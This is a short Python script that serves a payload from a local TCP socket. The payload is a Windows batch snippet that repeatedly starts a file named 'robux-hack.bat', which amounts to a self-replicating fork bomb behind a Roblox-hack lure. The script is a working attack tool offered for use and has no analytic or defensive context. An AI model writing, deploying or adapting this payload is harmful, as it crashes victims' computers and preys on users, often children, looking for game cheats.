import socket

payload = b'@echo off\r\nstart robux-hack.bat\r\nstart robux-hack.bat\r\nstart robux-hack.bat'

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.bind(('127.0.0.1', 47024))

    print('\nBound socket to port.\n')

    print('\nListening for incoming connection...\n')

    s.listen(1)

    conn, addr = s.accept()
    with conn:
        try:
            print('\nConnected by ', addr[0], addr[1], '\n')
            conn.sendall(payload)
            print('\nPayload sent.\n')
            conn.close()
            print('\nConnection closed.\n')
        except BrokenPipeError as e:
            print('\nGot a broken pipe error.', e, '\n')
            conn.close()
            print('\nConnection closed.\n')

    s.close()
except OSError as e:
    print('Python being a bitch rn.', e)
